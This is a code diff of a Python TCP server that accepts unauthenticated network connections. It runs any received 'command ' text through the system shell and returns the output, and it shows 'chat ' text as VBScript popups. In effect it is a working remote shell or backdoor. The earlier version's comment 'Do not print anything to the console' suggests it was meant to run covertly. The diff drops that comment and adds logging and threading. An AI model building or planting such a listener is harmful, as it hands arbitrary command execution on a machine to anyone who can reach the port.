@@ -13,9 +13,8 @@ PORT = 65432  # Port to listen on
 
 def execute_command(command, conn):
     try:
-        # Start the command asynchronously
         process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-        stdout, stderr = process.communicate()  # Get command output and errors
+        stdout, stderr = process.communicate()
         if stdout:
             conn.sendall(stdout.encode('utf-8'))
         if stderr:
@@ -26,45 +25,48 @@ def execute_command(command, conn):
         conn.sendall(f"Error: {str(e)}".encode('utf-8'))
 
 def show_vbs_popup(message):
-    # Create a VBScript file to display a message box
     vbs_code = f'Set obj = CreateObject("WScript.Shell")\nobj.Popup "{message}", 5, "Message", 64'
     vbs_file = 'popup.vbs'
     with open(vbs_file, 'w') as file:
         file.write(vbs_code)
-    # Execute the VBScript
     os.system(f'cscript //nologo {vbs_file}')
-    # Optionally, remove the VBScript file after execution
     os.remove(vbs_file)
 
-def handle_client(conn):
+def handle_client(conn, addr):
     with conn:
+        print(f"Connected by {addr}")
         while True:
-            data = conn.recv(1024).decode('utf-8')
-            if not data:
+            try:
+                data = conn.recv(1024).decode('utf-8')
+                if not data:
+                    break
+                if data.lower() == 'exit':
+                    conn.sendall(b'Connection closed.')
+                    break
+                if data.lower().startswith('command '):
+                    command = data[8:].strip()
+                    threading.Thread(target=execute_command, args=(command, conn)).start()
+                elif data.lower().startswith('chat '):
+                    message = data[5:].strip()
+                    show_vbs_popup(message)
+                    conn.sendall(b'Popup displayed for non-command text.')
+                else:
+                    conn.sendall(b'Invalid input. Prefix with "command " or "chat ".')
+            except ConnectionResetError:
+                print(f"Connection reset by {addr}")
                 break
-            if data.lower() == 'exit':
-                conn.sendall(b'Connection closed.')
+            except Exception as e:
+                print(f"Error handling client {addr}: {e}")
                 break
-            if data.lower().startswith('command '):
-                # Execute command if it starts with 'command'
-                command = data[8:].strip()  # Remove 'command ' prefix
-                threading.Thread(target=execute_command, args=(command, conn)).start()
-            elif data.lower().startswith('chat '):
-                # Show VBScript popup for non-command text
-                message = data[5:].strip()  # Remove 'chat ' prefix
-                show_vbs_popup(message)
-                conn.sendall(b'Popup displayed for non-command text.')
-            else:
-                conn.sendall(b'Invalid input. Prefix with "command " or "chat ".')
-                
+
 def main():
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         s.bind((HOST, PORT))
         s.listen(5)
-        # Do not print anything to the console
+        print(f"Server listening on {HOST}:{PORT}")
         while True:
-            conn, addr = s.accept()  # Automatically captures client's IP address
-            handle_client(conn)
+            conn, addr = s.accept()
+            threading.Thread(target=handle_client, args=(conn, addr)).start()
 
 if __name__ == "__main__":
     main()
